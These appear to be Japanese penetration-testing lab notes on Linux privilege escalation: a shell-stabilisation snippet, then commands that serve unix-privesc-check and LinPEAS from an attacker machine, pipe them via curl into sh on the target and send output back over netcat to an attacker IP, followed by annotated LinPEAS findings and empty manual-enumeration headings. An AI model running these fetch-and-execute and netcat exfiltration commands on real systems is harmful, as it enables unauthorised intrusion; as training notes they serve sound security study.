# シェルの安定化

※penelopeでシェル獲得できた場合は不要
```zsh
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm-256color
# Ctrl + Z
stty raw -echo; fg
```

---

# Auto 

## unix-privesc-check

### 転送・実行

```zsh
# Attacker
cp /usr/bin/unix-privesc-check .
python -m http.server 8888
nc -lvnp 9002 | tee unix-privesc-check.out
```
```zsh
# Target
curl 192.168.45.182:8888/unix-privesc-check | sh -s standard | nc -q 0 192.168.45.182 9002
```

### 実行結果抽出 -> 実行失敗



---

## LinPEAS

### 転送・実行

```zsh
# Attacker
cp /usr/share/peass/linpeas/linpeas.sh .
python -m http.server 8888
nc -lvnp 9002 | tee linpeas.out
```
```zsh
# Target
curl 192.168.45.182:8888/linpeas.sh | sh | nc -q 0 192.168.45.182 9002
```

### 実行結果抽出

```powershell
# rootがapacheを動作させているので、LFIさせられれば、root に権限昇格
╔══════════╣ Running processes (cleaned)
╚ Check weird & unexpected processes run by root: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#processes                                               

root      1402  0.0  2.5 492324 26028 ?        Ss   00:04   0:00 /usr/sbin/apache2 -k start

# mdadmという見慣れないcron
══╣ Cron jobs list                                                            
/usr/bin/crontab                                                              
incrontab Not Found
-rw-r--r-- 1 root root     722 Nov 16  2017 /etc/crontab                      

/etc/cron.d:
total 24
drwxr-xr-x   2 root root 4096 May 17  2021 .
drwxr-xr-x 102 root root 4096 May 27  2021 ..
-rw-r--r--   1 root root  102 Nov 16  2017 .placeholder
-rw-r--r--   1 root root  589 Mar  7  2018 mdadm

# ポート22（おそらくSSH）が動作
╔══════════╣ Active Ports
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-ports                                                                    
══╣ Active Ports (netstat)                                                    
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN    

══╣ Polkit Binary
Pkexec binary found at: /usr/bin/pkexec                                       
Pkexec binary has SUID bit set!
-rwsr-xr-x 1 root root 22520 Mar 27  2019 /usr/bin/pkexec
pkexec version 0.105

```

---
---

# Manual

## ユーザー


---

## システム情報


---

## 実行中のプロセス


---

## ネットワーク


---

## Cron


---

## インストール済みアプリケーション


---

## アクセス制限が不十分なファイル/ディレクトリ


---

## マウントされていないドライブ


---

## 高権限をもつバイナリの列挙



---

## システムデーモン



---

## 共有フォルダ、SNMP情報


---

## 興味深い情報


---

## デバイスドライバ・カーネルモジュール



